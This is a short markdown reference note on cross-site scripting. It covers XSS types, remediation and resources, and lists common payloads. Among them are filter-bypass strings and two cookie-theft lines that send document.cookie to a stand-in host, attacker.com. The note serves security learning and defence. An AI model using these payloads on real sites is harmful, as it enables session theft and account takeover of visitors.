---
tags: [vulnerability, web, xss]
vuln_name: "Cross-Site Scripting"
owasp_category: "A03:2021 - Injection"
cvss_score: 6.1
last_updated: 2024-01-01
---

# 🐛 Cross-Site Scripting (XSS)

## 📖 Description

> Injection of malicious scripts into web pages viewed by other users. Allows stealing cookies, redirecting users, or performing actions on their behalf.

**OWASP:** A03:2021 — Injection  
**Average CVSS Score:** 6.1 (Medium)

---

## 🔬 Types of XSS

| Type | Description | Persistence |
|------|-------------|-------------|
| **Reflected** | Payload in URL, reflected in the response | Non-persistent |
| **Stored** | Payload stored in DB, displayed on every visit | Persistent ⚠️ |
| **DOM-Based** | Client-side DOM manipulation | Variable |

---

## 💥 Common Payloads

### Basic test

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
"><script>alert('XSS')</script>
javascript:alert('XSS')
```

### Cookie theft (real impact)

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

### Filter bypass

```html
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert`XSS`</script>
<svg onload=alert('XSS')>
```

---

## 🛡️ Remediation

- **Output escaping** — encode `<`, `>`, `"`, `'`, `&`
- **Content Security Policy (CSP)** — HTTP header restricting scripts
- **HttpOnly cookies** — not accessible via JavaScript
- **Input validation** — server-side only

---

## 🔗 Resources

- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
